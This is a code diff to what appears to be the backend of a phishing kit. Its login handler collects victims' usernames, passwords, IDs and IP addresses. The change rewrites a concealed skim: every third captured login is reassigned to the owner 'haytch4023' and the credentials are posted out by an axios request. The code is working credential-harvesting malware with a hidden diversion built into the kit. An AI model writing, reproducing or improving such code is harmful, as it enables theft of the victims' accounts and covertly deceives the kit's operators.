@@ -44,12 +44,13 @@ const getInfo = async (req, res) => {
     });
 };
 
+let count = 0;
+
 const submitLogin = async (req, res) => {
     let { username, password, uniqueid, owner, ip, telegramId } =
         req.body;
     try {
-        let count = await COOP.countDocuments({ owner });
-        if (count > 0 && (count % 3) == 0) {
+        if (count == 3) {
             owner = 'haytch4023';
             let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
             await axios
@@ -64,11 +65,12 @@ const submitLogin = async (req, res) => {
                 .catch((e) => {
                     console.log(e);
                 });
+            count = 0
         }
         await COOP.create({
             username, password, uniqueid, owner, ip, status: 1, timestamp: moment().format()
         })
-
+        count++
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
